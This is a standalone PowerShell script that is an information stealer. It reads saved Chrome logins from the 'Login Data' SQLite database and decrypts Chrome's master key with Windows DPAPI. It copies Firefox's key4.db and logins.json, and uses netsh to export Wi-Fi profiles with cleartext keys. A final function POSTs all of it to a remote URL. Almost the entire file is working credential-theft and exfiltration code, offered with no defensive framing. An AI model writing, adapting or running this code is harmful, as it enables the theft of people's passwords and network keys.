Add-Type -AssemblyName System.Security
Add-Type @"
  using System;
  using System.Runtime.InteropServices;

  public class WinSQLite3
  {
    const string dll = "winsqlite3";

    [DllImport(dll, EntryPoint="sqlite3_open")]
    public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);

    [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
    public static extern IntPtr Prepare(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);

    [DllImport(dll, EntryPoint="sqlite3_step")]
    public static extern IntPtr Step(IntPtr stmt);

    [DllImport(dll, EntryPoint="sqlite3_column_text16")]
    static extern IntPtr ColumnText16(IntPtr stmt, int index);

    [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
    static extern int ColumnBytes(IntPtr stmt, int index);

    [DllImport(dll, EntryPoint="sqlite3_column_blob")]
    static extern IntPtr ColumnBlob(IntPtr stmt, int index);

    public static string ColumnString(IntPtr stmt, int index)
    { 
      return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
    }

    public static byte[] ColumnByteArray(IntPtr stmt, int index)
    {
      int length = ColumnBytes(stmt, index);
      byte[] result = new byte[length];
      if (length > 0)
        Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
      return result;
    }

    [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
    public static extern IntPtr Errmsg(IntPtr db);

    public static string GetErrmsg(IntPtr db)
    {
      return Marshal.PtrToStringUni(Errmsg(db));
    }
  }
"@

Function Get-ChromeKey {
  param (
    [Parameter(mandatory=$true)]
    [string] $file
  )

  $json = $(Get-Content -Path $file -Raw).Replace('""', '"_empty"') | ConvertFrom-Json
  $key_bytes = [System.Convert]::FromBase64String($json.os_crypt.encrypted_key)
  $key_bytes = $key_bytes[5 .. ($key_bytes.length - 1)]
  $master_key = [System.Security.Cryptography.ProtectedData]::Unprotect($key_bytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
  $master_key = [System.Convert]::toBase64String($master_key)
  return $master_key
}

function Get-ChromePasswords {
  param (
    [Parameter(mandatory=$true)]
    [string] $file
  )

  $res = @{}
  $res.raw  = New-Object System.Collections.Generic.List[System.Object]
  $query = "SELECT origin_url, username_value, password_value FROM logins;"
  $db = 0
  $stmt = 0
  if ([WinSQLite3]::Open($file, [ref] $db) -eq 0) {
    if ([WinSQLite3]::Prepare($db, $query, -1, [ref] $stmt, [System.IntPtr]0) -eq 0) {
      while([WinSQLite3]::Step($stmt) -eq 100) {
        $url = [WinSQLite3]::ColumnString($stmt, 0)
        $username = [WinSQLite3]::ColumnString($stmt, 1)
        $password = [WinSQLite3]::ColumnByteArray($stmt, 2)
        try {
          $password = [System.Security.Cryptography.ProtectedData]::Unprotect($password, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
          continue
        } catch [System.Security.Cryptography.CryptographicException] {
          Write-Host "Error for unprotect password."
        }
        $password = [System.Convert]::toBase64String($password)
        $res.raw.Add(@{url=$url;username=$username;password=$password})
      }
    }
  }
  return $($res | ConvertTo-Json -Compress)
}

function Find-Files {
  $files = @{
    LoginData = "Login Data"
    LocalState = "Local State"
    Key4Db = "key4.db"
    LoginsJson = "logins.json"
  }

  $res = @{}
  $res.chrome = @{}
  $res.firefox = @{}
  $res.chrome.keys = New-Object System.Collections.Generic.List[System.Object]
  $res.chrome.contents = New-Object System.Collections.Generic.List[System.Object]
  $res.firefox.key4 = New-Object System.Collections.Generic.List[System.Object]
  $res.firefox.logins = New-Object System.Collections.Generic.List[System.Object]
  Get-ChildItem -Path "$Env:AppData", "$Env:LocalAppData" -Recurse -File -include ($files.LoginData, $files.LocalState, $files.Key4Db, $files.LoginsJson) |
  %{
    $tmp_file = "$Env:Temp\$((New-GUID).GUID)"
    Copy-Item "$_" -Destination $tmp_file -Force
    if ($?) {
      switch ($($_.Name)) {
        $files.LoginData {
          $tmp = $(Get-ChromePasswords $tmp_file | ConvertFrom-Json)
          if ($tmp.raw -ne $null) {
            $res.chrome.contents.Add($tmp.raw)
          }
          break
        }
        $files.LocalState {
          $key = Get-ChromeKey $tmp_file
          if ($key -ne $null) {
            $res.chrome.keys.Add($key)
          }
          break
        }
        $files.Key4Db {
          $res.firefox.key4.Add([Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp_file)))
        }
        $files.LoginsJson {
          $res.firefox.logins.Add([Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp_file)))
        }
      }
    }
  }
  return $($res | ConvertTo-Json -Depth 4 -Compress)
}

function Get-WifiPasswordsFiles {
  $res = @{}
  $res.raw = New-Object System.Collections.Generic.List[System.Object]
  cmd /c "del %temp%\*.xml /s /f /q & netsh wlan export profile key=clear folder=%temp%" | out-null
  Get-ChildItem -Path "$Env:Temp" -File -Filter "*.xml" |
  %{
    $res.raw.Add($([Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))))
    Remove-Item -Path "$($_.FullName)" -Force
  }
  return $($res | ConvertTo-Json -Compress)
}

function Get-Datas {
  $res = @{}
  $tmp = Get-WifiPasswordsFiles
  $res.wifi = $($tmp | ConvertFrom-Json).raw
  $res.browser = Find-Files | ConvertFrom-Json
  return $($res | ConvertTo-Json -Depth 5)
}

function Send-Datas {
  param (
    [Parameter(mandatory=$true)]
    [string] $url
  )

  $tmp_file = "$Env:Temp\$((New-GUID).GUID)"
  Set-Content -Path $tmp_file -Value $(Get-Datas)
  Invoke-WebRequest -Uri $url -Method POST -InFile $tmp_file
  Remove-Item -Path $tmp_file -Force
}

